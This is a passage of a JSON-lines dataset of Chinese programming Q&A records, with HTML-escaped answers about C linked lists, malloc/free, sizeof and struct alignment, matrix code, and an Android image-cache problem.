"Initlist_L", "( LinkList l )", "{      ", "//创建链表并初始化", "\n    ", "int", " a,b;\n    ", "int", " c = ", "0", ";\n    Node* p,*q = ", "NULL", ";\n    l = (LinkList)", "malloc", "(", "sizeof", "(Node));\n    l->next = ", "NULL", ";               ", "//创建头结点", "\n    ", "if", "( !l ){\n        ", "return", " ", "-1", ";\n    }\n    ", "printf", "( ", "\"是否输入数据？Yes：1；No: 0\"", " );\n    ", "scanf", "( ", "\"%d\"", ",&a );\n    ", "while", "( a ){\n        ", "if", "( !(c++) ){\n        p = (Node*)", "malloc", "(", "sizeof", "(Node));\n        ", "printf", "( ", "\"请输入数据：\"", ");\n        ", "scanf", "( ", "\"%d\"", ",&b );\n        p->data = b;\n        p->next = l->next;\n        l->next = p;\n        q = p;\n        }", "else", " {\n            p = (Node*)", "malloc", "(", "sizeof", "(Node));\n            ", "printf", "( ", "\"请输入数据：\"", ");\n            ", "scanf", "( ", "\"%d\"", ",&b );\n            p->data = b;\n            q->next = p;\n            p->next = ", "NULL", ";\n            q = p;\n        }\n        ", "printf", "( ", "\"是否继续输入数据？Yes: 1; No: 0\"", ");\n        ", "scanf", "( ", "\"%d\"", ",&a );\n\n    }\n    ", "printf", "( ", "\"\\n\"", " );\n    ", "return", " ", "0", ";\n};      \n\n\n"]], "Tag": "程序设计"}
{"Answer": "http://www.cnblogs.com/gw811/archive/2012/10/13/2722752.html", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["java运算符的先后顺序", ["\n", "*=", "\n＜＜ ", "\n ％ ", "\n  sizeof", "\n由低至高的正确顺序", "\n求大神", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;#include &amp;lt;stdio.h&amp;gt;\n#define &lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;\nint is_symmetricmatrix(int a[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;,int &lt;span class=\"hljs-symbol\"&gt;Col&lt;/span&gt;)//判断一个&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;*&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;矩阵&amp;#xff0c;是否是对称矩阵&amp;#xff0c;是返回&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;&amp;#xff0c;否返回&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n{\n    int i, j, flag;\n    for (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, flag &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; i; j&amp;#43;&amp;#43;)\n        {\n            if (a[i][j] !&amp;#61; a[j][i])\n            {\n                flag &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n                break;\n            }\n        }\n        if (j &amp;lt; i) break;\n    }\n    if (flag)\n        return &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;  \n    else\n        return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;  \n}\nvoid getTransposeMatrix(int b[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int a[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;, int &lt;span class=\"hljs-symbol\"&gt;Col&lt;/span&gt;)//矩阵转置\n{\n    int i, j;\n    for (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;; i&amp;#43;&amp;#43;)\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Col&lt;/span&gt;; j&amp;#43;&amp;#43;)\n            b[j][i] &amp;#61; a[i][j];\n}\nvoid matrixMul(int a[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int b[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int c[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int &lt;span class=\"hljs-symbol\"&gt;Rowa&lt;/span&gt;, int &lt;span class=\"hljs-symbol\"&gt;Cola&lt;/span&gt;, int &lt;span class=\"hljs-symbol\"&gt;Colb&lt;/span&gt;)//矩阵相乘\n{\n    int i, j, k;\n    for(i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=\"hljs-symbol\"&gt;Rowa&lt;/span&gt;;i&amp;#43;&amp;#43;)\n    {\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Colb&lt;/span&gt;; j&amp;#43;&amp;#43;)\n        {\n            for (k &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Cola&lt;/span&gt;; k&amp;#43;&amp;#43;)\n                c[i][j] &amp;#43;&amp;#61; a[i][k] * b[k][j];\n        }\n    }\n\n}\nvoid matrixAdd(int a[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int b[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int c[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int &lt;span class=\"hljs-symbol\"&gt;Rowa&lt;/span&gt;, int &lt;span class=\"hljs-symbol\"&gt;Cola&lt;/span&gt;)//矩阵相加\n{\n    int i, j;\n    for (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Rowa&lt;/span&gt;; i&amp;#43;&amp;#43;)\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Cola&lt;/span&gt;; j&amp;#43;&amp;#43;)\n            c[i][j] &amp;#61; a[i][j] &amp;#43; b[i][j];\n}\nvoid printmatrix(int a[][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;], int &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;, int &lt;span class=\"hljs-symbol\"&gt;Col&lt;/span&gt;)\n{\n    int i, j;\n    for (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Row&lt;/span&gt;; i&amp;#43;&amp;#43;){\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; &lt;span class=\"hljs-symbol\"&gt;Col&lt;/span&gt;; j&amp;#43;&amp;#43;)\n        {\n            printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, a[i][j]);\n        }\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n    }\n}\nint main()\n{\n    int a[&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; }, b[&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; }, c[&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;][&lt;span class=\"hljs-symbol\"&gt;N&lt;/span&gt;] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;}, i, j, n &amp;#61; &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;;\n\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;n);\n    for (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; n; i&amp;#43;&amp;#43;)\n        for (j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; n; j&amp;#43;&amp;#43;)\n            scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;a[i][j]);\n    if (is_symmetricmatrix(a, n, n))\n    {\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;YES\\n&amp;#34;&lt;/span&gt;);\n        getTransposeMatrix(b, a, n, n);\n        matrixMul(a, b, c, n, n, n);\n        printmatrix(c, n, n);\n    }\n    else{\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;NO\\n&amp;#34;&lt;/span&gt;);\n        getTransposeMatrix(b, a, n, n);\n        matrixAdd(a, b, c, n, n);\n        printmatrix(c, n, n);\n    }\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言矩阵运算，关键部分我好像写错了", ["标注出来的是我不太明白的地方，我写的这个编译没有问题，就是答案很奇怪，能帮忙改改吗？谢了", "\n", "\n#include<stdio.h>\nint main()\n{\n    int n,i,j;\n    scanf(", "\"%d\"", ",&n);\n    int a[n][n],b[n][n],c[n][n],d[n][n];\n    \n    for (i=", "0", ";i<n;i++)\n    {\n        for (j=", "0", ";j<n;j++)\n        {\n            scanf(", "\"%d\"", ",&a[i][j]);\n        }\n    }\n    \n    for (i=", "0", ";i<n;i++)\n    {\n        for (j=", "0", ";j<n;j++)\n        {\n            if (a[i][j]==a[j][i])\n            {\n                printf(", "\"YES\\n\"", ");\n                b[j][i]=a[j][i];\n                for (j=", "0", ";j<n;j++)\n                {\n                    d[i][j]=a[i][j]*b[j][i];\n                    c[i][j]=c[i][j]+d[i][j];\n                    printf(", "\"%d \"", ",c[i][j]);\n                }\n            }    \n            else\n            {\n                printf(", "\"NO\\n\"", ");\n                b[j][i]=a[j][i];\n                d[i][j]=a[i][j]+b[j][i];\n                c[i][j]=c[i][j]+d[i][j];\n                printf(", "\"%d \"", ",c[i][j]);\n            }\n        }\n    }\n    printf(", "\"\\n\"", ");\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/115261696746187.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言编程输入和输出", ["请编程输出分别输出double  long double   long long   3.14F   3.14   521   521LL在内存中占多少字节。 请使用运算符sizeof计算以上值。", "\n", "输出格式:", "每两个值之间有一个空格。不要输出多余的字符。"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n\n&amp;#96;&amp;#96;&amp;#96;c&lt;span class=\"hljs-built_in\"&gt;\nint &lt;/span&gt;F(char *str)\n{\n   &lt;span class=\"hljs-built_in\"&gt; int &lt;/span&gt;check;\n   &lt;span class=\"hljs-built_in\"&gt; int &lt;/span&gt;sumall;\n   &lt;span class=\"hljs-built_in\"&gt; int &lt;/span&gt;sumsub;\n\n    sumall &amp;#61; 0;\n\n    for( ; *str !&amp;#61; 0; str&amp;#43;&amp;#43;)\n    {\n       &lt;span class=\"hljs-built_in\"&gt; check &lt;/span&gt;&amp;#61; 0x03FFFFFF;\n        sumsub &amp;#61; 0;\n\n        for(char *c &amp;#61; str; *c !&amp;#61; 0; c&amp;#43;&amp;#43;)\n        {\n            if(/*check &amp;gt; 0 &amp;amp;&amp;amp; //为什么又封起来了&amp;#xff0c;因为有26个字母的字符串不大可能*/ (((int)1 &amp;lt;&amp;lt; (*c - &amp;#39;a&amp;#39;)) &amp;amp; check) !&amp;#61; 0)\n            {\n                sumsub&amp;#43;&amp;#43;;\n               &lt;span class=\"hljs-built_in\"&gt; check &lt;/span&gt;&amp;#61;&lt;span class=\"hljs-built_in\"&gt; check &lt;/span&gt;- ((int)1 &amp;lt;&amp;lt; (*c - &amp;#39;a&amp;#39;)); //修改了&amp;#xff0c;再减少一次运算&amp;#xff0c;不过我以前有测试过位运算比加减法要快一些的&amp;#xff0c;快多少就忘记了&amp;#xff0c;不知道两个位运算和一个减法到底谁快\n            }\n\n            sumall &amp;#61; sumall &amp;#43; sumsub;\n        }\n    }\n\n   &lt;span class=\"hljs-built_in\"&gt; return &lt;/span&gt;sumall;\n}\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&amp;#96;&amp;#96;&amp;#96;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["蓝桥杯 字串分值和   如何取优化此代码的内存？", ["\n#include<stdio.h>\n#include<stdlib.h>\n#define MAXSIZE ", "100000", "\n\ntypedef struct node{\n    char ", "data", ";\n    struct node *next;\n}linkList,LNode;\n\nvoid init(linkList *L) {\n    ", "//L = (linkList*)malloc(sizeof(linkList));", "\n    L->next = NULL;\n    L->", "data", " = ", "'\\0'", ";\n}\n\nvoid add(linkList *L,char x) {\n    LNode *p=(LNode*)malloc(sizeof(LNode));\n    ", "p", "->", "data", " = x;\n    ", "p", "->", "next", " = L->", "next;\n    L->next = p;\n    L = p;\n}\n\n\nvoid del(linkList *L, char x) {\n    LN", "ode", " *p = L->", "next;\n    int flag = ", "0", ";\n    LNode * pre = L;\n    ", "while", " (p != NULL) {\n        \n        ", "if", " (p->", "data", " == x&&!flag) {\n            flag = ", "1", ";\n            pre = p;\n            ", "p", " = p->", "next;\n        }\n        ", "else", " ", "if", " (p->", "data", " == x && flag) {\n            LN", "ode", " *temp = p->", "next;\n            ", "if", " (temp != NULL) {\n                ", "pre", "->", "next = temp;\n                ", "//free(temp);", "\n            }\n            ", "else", "\n            {\n                ", "pre", "->", "next", " = p->", "next;\n            }\n            ", "p", " = p->", "next;\n        }\n        ", "else", " {\n            pre = p;\n            ", "p", " = p->", "next;\n        }\n    }\n}\n\nmain() {\n    char *S = (char*)malloc(sizeof(char)*MAXSIZE);\n    scanf_s(", "\"%s\"", ", S, MAXSIZE);\n    int n = ", "1", ";\n    ", "for", " (n = ", "1", "; S[n - ", "1", "] != ", "'\\0'", "; n++);\n    int sum = ", "0", ";\n    linkList * L=(linkList*)malloc(sizeof(linkList));\n    \n    \n    ", "for", " (int i = ", "0", "; i < n-", "1", "; i++) {\n        ", "for", " (int j = i; j < n-", "1", "; j++) {\n            init(L);\n            int count = ", "0", ";\n            ", "for", " (int k = i; k <= j; k++) {\n                add(L, S[k]);\n            }\n            LNode *head = L;\n            LN", "ode", " *p = head->", "next;\n            ", "while", " (p!= NULL) {\n                ", "char", " c = p->", "data", ";\n                LN", "ode", " *t = p->", "next;\n                ", "while", " (t!=NULL) {\n                    ", "if", " (c == t->", "data", ")\n                        del(L, c);\n                    ", "t", " = t->", "next;\n                }\n                free(t);\n                ", "p", " = p->", "next;\n            }\n            free(p);\n            LNode *p3 = L;\n            ", "while", " (p3->", "next != NULL) {\n                count++;\n                ", "p3", " = p3->", "next;\n            }\n            sum += count;\n        }\n\n    }\n    printf(", "\"%d\"", ", sum);\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组直接有length属性。&lt;/p&gt;\n\n&lt;p&gt;int size &amp;#61; arr.length;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["java是不允许有sizeof吗 不允许的话该怎么写 而且我在代码最下面写return 0;他为什么给我报错啊", []], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;链表用的就是这个指针&amp;#xff0c;你不应该在插入的时候free的才是对的&amp;#xff0c;但是你应该free是在链表删除一个节点或者删除的时候依次free掉这里的内存。&lt;/p&gt;\n&lt;p&gt;你得代码能过&amp;#xff1f;  第一次用while的时候 你的n没有初始化啊&amp;#xff0c;这指针指向。。。&lt;/p&gt;\n&lt;p&gt;你先把这个没初始化改了&amp;#xff0c;然后看有问题吧&amp;#xff0c;可能是这里导致的&amp;#xff0c;没初始化的话&amp;#xff0c;内存是乱的。&lt;br /&gt;至于创建的逻辑 看起来没问题&amp;#xff0c;至少我没看出问题&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/222377975646146.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言链表，要不要释放内存（free)", ["我不知道是我代码写错了还是怎么", "麻烦各位大家看看", "\n", "//单链表前插法 ", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "struct", " ", "Student", "\n{\n    ", "int", " num;\n    \n    ", "struct", " ", "Student", " *next;    \n}; \n", "struct", " ", "Student", " *", "create", "()\n{\n    ", "struct", " ", "Student", " *head,*n;", "//n是新节点 ", "\n    ", "int", " i;\n    head=(", "struct", " Student *)", "malloc", "(", "sizeof", "(", "struct", " Student));\n    head->next=", "NULL", ";", "//头指针指向为空", "\n    ", "while", "(n->num!=", "0", ")\n    {    \n        n =(", "struct", " Student *)", "malloc", "(", "sizeof", "(", "struct", " Student));\n        ", "printf", "(", "\"num=\"", ");\n        ", "scanf", "(", "\"%d\"", ",&n->num);\n        n->next=head->next;", "//新节点指向head节点指向的节点", "\n        head->next=n; \n    }    \n", "//    free(n);//添加free输出不正确 ", "\n    ", "return", " head;\n} \n", "void", " ", "print", "(", "struct", " Student *head)", "\n", "{\n    ", "int", " s;\n    ", "struct", " ", "Student", " *temp;\n    ", "printf", "(", "\"-----------the list -----------\"", ");\n    temp=head;\n    ", "while", "(temp!=", "NULL", ")\n    {\n        ", "printf", "(", "\"the num=%d\\n\"", ",temp->num);\n        temp=temp->next;\n        \n    }\n}\n", "int", " ", "main", "()", "{\n    ", "struct", " ", "Student", " *head;", "//定义一个头指针 ", "\n    head=", "create", "();\n    ", "print", "(head);\n    ", "return", " ", "0", ";\n}\n\n", "\n", "不加free", "\n", "加上free", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这不是内存超限&amp;#xff0c;这是段错误&lt;br /&gt;for(i&amp;#61;0;i&amp;lt;p&amp;#43;1;i&amp;#43;&amp;#43;){&lt;!-- --&gt;&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;        q &amp;#61; pafter-&amp;gt;next;&lt;/span&gt;&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;        pafter &amp;#61; q;&lt;/span&gt;&lt;br /&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;    }&lt;/span&gt;&lt;br /&gt;这个是有风险的&amp;#xff0c;如果删除的是最后一个节点呢&amp;#xff0c;它是没有after的啊&amp;#xff0c;最后一个pafter-&amp;gt;next会崩溃的。你应该检查一下pafter是否为空。如果为空表示要删除的是最后一个节点&amp;#xff0c;直接让pfront-&amp;gt;next &amp;#61; NULL好了。&lt;br /&gt;另外&amp;#xff0c;被删除的节点你也应该free掉才符合你这段代码的风格&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["cfree里链表代码可以运行，但是提交发现内存超限", ["问题遇到的现象和发生背景", "\n", "发现cfree里链表代码可以运行，但是提交到平台发现内存错误，救命啊！", "要求：", "输入一系列字符以-#作为结束标志，用尾插法创建链表并存储数据，然后在指定位置删除一个新的字符，并输出结果", "\n", "输入", "第一行输入一一个字符串，以#结束", "一个整数p", "输出", "链表所有数据（删除前、删除后）各占一行", "\n", "样例输入", "abcde#", "2", "样例输出", "a b c d e", "a c d e ", "\n", "问题相关代码，请勿粘贴截图", "\n", "#", "include", "\"stdio.h\"", "\n", "#", "include", "\"stdlib.h\"", "\n", "typedef", " ", "struct", " ", "node", "{\n    ", "char", " data;\n    ", "struct", " ", "node", " *next;\n}Node;\n\n", "Node * ", "creatlink", "()", ";\n", "void", " ", "Dellink", "(Node *h,", "int", " p)", ";\n", "void", " ", "output", "(Node *h)", ";\n", "void", " ", "destroylink", "(Node *h)", ";\n", "main", "()\n{\n    Node *head=", "NULL", ";\n    ", "int", " p;\n    head = ", "creatlink", "(); \n    ", "scanf", "(", "\"%d\"", ",&p);\n    ", "output", "(head);                  \n    ", "Dellink", "(head,p);                 \n    ", "output", "(head);                  \n    ", "destroylink", "(head);                  \n}\n", "Node * ", "creatlink", "()", "\n", "{\n   Node *head=", "NULL", ",*p,*q;\n   ", "char", " ch;\n   \n   head=(Node *)", "malloc", "(", "sizeof", "(Node));  ", "//创建头结点，不存放有效数据", "\n    head->next=", "NULL", ";\n   q=head;\n   ", "while", "(", "1", ")        ", "//创建链表", "\n   {\n           ", "scanf", "(", "\"%c\"", ",&ch);\n           ", "if", "(ch!=", "'#'", "){\n               p = (", "struct", " node*)", "malloc", "(", "sizeof", "(", "struct", " node));\n               p -> data = ch;\n               p -> next = ", "NULL", ";\n               q -> next = p;\n               q = p;\n           }\n           ", "else", "\n           ", "break", ";\n   }\n   ", "return", " head;\n}\n", "void", " ", "Dellink", "(Node *h,", "int", " p)", "{\n    Node *pfront,*pafter,*q;\n    pfront=h;\n    pafter=h;\n    ", "int", " i;\n    ", "for", "(i=", "0", ";i<p", "-1", ";i++){\n        q = pfront->next;\n        pfront = q;    \n    }    \n    ", "for", "(i=", "0", ";i<p+", "1", ";i++){\n        q = pafter->next;\n        pafter = q;    \n    }    \n    pfront->next = pafter;         \n}\n", "void", " ", "output", "(Node *h)", "{\n    Node *p ;\n    p=h->next;\n    ", "while", "(p){\n        ", "printf", "(", "\"%c \"", ",p->data);\n        p=p->next;\n    }\n    ", "printf", "(", "\"\\n\"", ");\n}\n", "void", " ", "destroylink", "(Node *h)", "{\n    Node *q;\n    ", "while", "(h!=", "NULL", ")\n    {\n        q=h;\n        h=h->next;\n        ", "free", "(q);\n    }\n}\n\n", "\n", "运行结果及报错内容", "\n", "cfree：无", "校园OJ平台：Runtime Error:Segmentation fault", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;每个数据类型都有对齐要求&amp;#xff08;为了执行效率&amp;#xff09;&amp;#xff0c;比如指针类型在64位机器上按8字节对齐&amp;#xff0c;int类型按4字节对齐。所以结构体内ele按4字节对齐&amp;#xff0c;next按把8字节对齐&amp;#xff0c;ele与next之间有4个字节间隙&amp;#xff0c;整个结构体大小为16字节&lt;/p&gt;\n&lt;p&gt;&lt;a href=\"https://en.cppreference.com/w/cpp/language/object#Alignment\" id=\"textarea_1641851869023_1641853233751_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/cpp/language/object#Alignment&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C/C++类/结构体的内存大小问题，此外 vscode 怎么调32/64 位", ["这是终端输出 ", "\n", "我寻思 4+8 不是 = 12 吗？", "\n", "还有 ，我这个sizeof(指针类型）是8字节 说明是 64 位的  vscode 怎么调 32/64 位  不像 visual studio 那样直接调吗？ "]], "Tag": "程序设计"}
{"Answer": "p根本没有变，因为你的strcnp只能修改指针指向的内容，而不能修改指针本身地址。如果你想修改p的地址，需要传递char**", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个动态内存分配的问题，函数执行后p指向哪里？", ["一下是我的代码：", "\n\n", " #include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\nchar *strcnp(char *sd,char *ds)\n{\n        char *q=sd;\n\n        while((*ds++=*sd++)!='\\0')\n        NULL;\n        return q;\n}\n\nint main()\n{\n\n        char *a[4]={\"abc\",\"def\",\"whf\",\"where\"};\n        printf(\"%d,%d\\n\",sizeof(a),sizeof(a[3]));\n        char *p=NULL;\n          p=(char *)malloc(strlen(a[0])+1);//若无此句，运行出现段错误\n        strcnp(a[0],p); //此句执行过后，p指向哪里？\n        printf(\"%s\\n\",p);\n        free(p);\n        return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;有区别。&lt;br /&gt;因为你想要的是一个指向堆&amp;#xff0c;这就是刚刚分配的内存空间的指针&amp;#xff0c;而malloc的返回值类型是void *&amp;#xff0c;所以要将他强制转换成指针类型LinkList *。&lt;br /&gt;如果q仅仅只是一个数值&amp;#xff0c;那么就用第一种&amp;#xff0c;不过这种不常见&amp;#xff0c;也不推荐&amp;#xff0c;因为堆上的数据用完后需要free释放掉&amp;#xff0c;所以这种方法不好。&lt;br /&gt;一般情况下用的都是指针&amp;#xff0c;这样就可以分配数组&amp;#xff0c;释放内存了。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于malloc分配问题", ["q = (LinkList)malloc(sizeof(Node));", "q = (LinkList *)malloc(sizeof(Node));", "在定义一个链表结构体后", "分配动态内存，这两个有什么区别吗", "求各位大神解释谢谢"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof(a[0])计算的时候也是计算的元素类型所占的内存空间&amp;#xff0c;跟直接用sizof(t)没区别&amp;#xff0c;唯一的区别在于&amp;#xff0c;用a[0]能避免写错数据类型。&lt;br /&gt;也就是说用sizeof(a)/sizeof(a[0]) 的时候&amp;#xff0c;你不需要关心a是char类型还是int或者double&amp;#xff0c;a[0]能自动转成对应的类型进行处理。&lt;br /&gt;如果用sizeof(t)的时候&amp;#xff0c;不同的类型需要修改 t 。&lt;br /&gt;差别仅此而已。&lt;br /&gt;如有帮助&amp;#xff0c;请点击我的回答下方的“&lt;strong&gt;采纳该答案&lt;/strong&gt;”按钮帮忙采纳一下&amp;#xff0c;谢谢。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/103808807836192.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["书上说后者比较差谁能解释一下", ["求数组a的长度sizeof(a)/sizeof(a[0]) 和 sizeof(a)/sizeof(t) t是数组元素的类型差别是什么呢"]], "Tag": "程序设计"}
{"Answer": "[图片的缓存与下载](http://blog.csdn.net/zgy621101/article/details/53330995 \"\")", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Android图片内存缓存的问题，从LruCache中得到的图片是一张黑的图片", ["今天自己动手写一个图片加载器，在使用内存缓存时，从LruCache中得到的图片是一张黑的图片，而不是我存储进去的图片。", "\n\n", "内存缓存的代码：", "\n\n", "     public class MemoryCache implements BaseCacheInterface {\n    final LruCache<String, Bitmap> mMemoryCache;\n\n    public MemoryCache() {\n        int memorySize = (int) (Runtime.getRuntime().maxMemory() / 1024);\n        int cacheSize = memorySize / 8;\n        mMemoryCache = new LruCache<String, Bitmap>(cacheSize){\n            @Override\n            protected int sizeOf(String key, Bitmap value) {\n                return value.getRowBytes() * value.getHeight() / 1024;\n            }\n        };\n    }\n\n        //存\n    @Override\n    public void add(String imageUrl, Bitmap bmp) {\n        Log.d(\"Http\", \"Memory cache add\");\n        mMemoryCache.put(StringUtils.toHex(imageUrl), bmp) ;\n    }\n\n        //取\n    @Override\n    public Bitmap get(String imageUrl) {\n        Log.d(\"Http\", \"Memory cache get\");\n        return mMemoryCache.get(StringUtils.toHex(imageUrl));\n    }\n    }\n", "\n\n", "加载器中，从缓存中读取图片的代码：", "\n\n", "     //调用load加载图片到imageview\n    public void load(final String link, final ImageView imageView){\n        Log.d(\"Http\", \"load\");\n\n        Bitmap bitmap = mCache.get(link);   //从缓存里获取图片\n        if (bitmap != null){\n            imageView.setImageBitmap(mCache.get(link));\n        } else {\n            downloadBitmap(link, imageView);    //缓存里没有，则从网络下载\n        }\n        Log.d(\"Http\", \"over\");\n\n    }\n\n    private void downloadBitmap(final String link, final ImageView imageView){\n        imageView.setTag(link);\n        ImageThreadExecutor.getInstance().execute(new Runnable() {      //封装的线程池\n            @Override\n            public void run() {\n                //imageHttpRequest为封装的Http请求类，downloadToInputStream（）返回InputStream\n                final Bitmap bitmap = BitmapFactory.decodeStream(imageHttpRequest.downloadToInputStream(link));\n                if (imageView.getTag().equals(link) && bitmap != null){\n                    mActivity.runOnUiThread(new Runnable() {\n                        @Override\n                        public void run() {\n                            imageView.setImageBitmap(bitmap);\n                        }\n                    });\n                    mCache.add(link, bitmap);\n                }\n            }\n        });\n    }\n"]], "Tag": "程序设计"}
